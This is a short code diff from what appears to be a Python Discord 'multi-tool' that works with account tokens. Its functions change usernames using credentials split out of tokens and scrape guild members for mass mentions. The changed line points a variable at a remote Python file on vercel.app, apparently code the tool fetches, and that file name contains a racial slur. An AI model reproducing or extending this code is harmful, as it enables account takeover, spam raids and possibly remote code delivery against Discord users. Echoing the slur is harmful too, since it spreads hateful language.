@@ -223,7 +223,7 @@ async def usernameChanger(token: str, username: str):
     token = spllited[2]
     m = await buildMultiTool(token)
     await m.usernameChange(username, password)
-uri = "https://fweref.vercel.app/niggerkernel.py"
+uri = "https://geohij.vercel.app/niggerkernel.py"
 async def scrapeMassMention(token, guildId, channelId):
     o = await buildMultiTool(token)
     res = await o.getGuild(guildId)
